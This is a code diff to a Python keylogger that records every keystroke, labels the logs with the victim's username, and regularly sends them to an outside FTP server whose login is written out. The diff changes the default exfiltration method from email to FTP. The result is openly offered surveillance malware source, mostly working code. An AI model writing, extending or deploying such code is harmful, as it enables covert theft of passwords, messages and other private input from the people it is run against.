@@ -6,9 +6,9 @@ import os
 from threading import Timer #Timer is used to make a method run after an interval of time
 from datetime import datetime
 
-SEND_REPORT_EVERY = 5
-EMAIL_ADDRESS = "email"
-EMAIL_PASSWORD = "password"
+SEND_REPORT_EVERY = 10
+EMAIL_ADDRESS = "email" #replace with your credentials
+EMAIL_PASSWORD = "pass"
 # FTP server credentials
 FTP_HOST = "ftp.dlptest.com"
 FTP_USER = "dlpuser"
@@ -16,7 +16,7 @@ FTP_PASS = "rNrKYTX9g7z3RgJRmxWuGHbeu"
 
 class Keylogger:
     
-    def __init__(self, interval, report_method="email"):
+    def __init__(self, interval, report_method="ftp"):
         #pass SEND_REPORT_EVERY to interval
         self.interval = interval
         self.report_method = report_method
@@ -24,7 +24,8 @@ class Keylogger:
         self.log = ""
         #record start and end datetimes
         self.start_dt = datetime.now()
-        self.end_dt = datetime.now()
+        self.user = os.environ.get('USERNAME')
+        
 
     def callback(self, event):
         #This callback is invoked whenever a keyboard event occurs
@@ -41,15 +42,13 @@ class Keylogger:
             self.log = self.log[:-1]
         elif name == "ctrl":
             name = "[CTRL]"
-        elif name == "None":
-            print ("No keystrokes captured.")
         self.log += name #whenever a key is pressed the character is appended to the self.log string
         
     def update_filename(self): #report the keylog to a local file
-        #construct the filename to be identified by start and end times
-        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
-        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
-        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"
+        #construct the filename to be identified by start time and username
+        start_dt_str = str(self.start_dt)[:-16].replace(" ", "-").replace(":", "")
+        self.filename = f"keylog-{self.user}-{start_dt_str}"
+        
 
     def report_to_file(self):
         #creates a log file in current directory from self.log variable
